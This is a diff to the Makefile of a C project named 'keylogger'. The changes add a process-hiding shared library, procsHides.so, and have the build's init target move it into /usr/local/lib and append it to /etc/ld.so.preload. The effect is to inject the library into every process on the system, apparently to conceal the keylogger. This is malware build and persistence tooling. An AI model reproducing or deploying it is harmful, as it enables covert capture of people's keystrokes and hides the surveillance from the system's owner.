@@ -4,18 +4,21 @@
 # Name of file
 NAME		=	keylogger
 
+# Name of libs
+LIB_HIDE	=	procsHides.so
 # Name directory
 PATH_INC	=	includes
 PATH_SRC	=	srcs
 PATH_OBJ	=	objs
 PATH_LOG	=	logs
+PATH_LIBH	=	lib/hideprocess
+PATH_INSTALL=	/usr/local/lib/
 #PATH_LIBFT	=	lib/libft
 
 # List of sources
-SRCS_TERM	=	keylogger.c
 SRCS		=	$(addprefix $(PATH_SRC)/, keylogger.c keymap.c utils.c mod.c)
-
 OBJS		=	$(addprefix $(PATH_OBJ)/, $(notdir $(SRCS:.c=.o)))
+
 INCS		=	$(addprefix $(PATH_INC)/, $(shell ls $(PATH_INC)))
 
 LOG			=	$(PATH_LOG)/$(NAME).log
@@ -27,7 +30,6 @@ COMP		=	clang
 COMP_FLAG	=	-Wall -Werror -Wextra
 COMP_DEB	=	-g3 -fsanitize=address
 COMP_ADD	=	-I$(PATH_INC) # -I$(PATH_LIBFT)/$(PATH_INC)
-
 # Others Command
 RM			=	/bin/rm
 
@@ -44,6 +46,9 @@ all:	init $(NAME)
 
 init:
 	@ $(shell mkdir -p $(PATH_OBJ) $(PATH_LOG))
+	@ make -C $(PATH_LIBH)
+	@ mv $(PATH_LIBH)/procsHides.so $(PATH_INSTALL)
+	@ echo /usr/local/lib/procsHides.so >> /etc/ld.so.preload
 	# @ make -C $(PATH_LIBFT)
 
 $(NAME): $(OBJS) $(INCS)
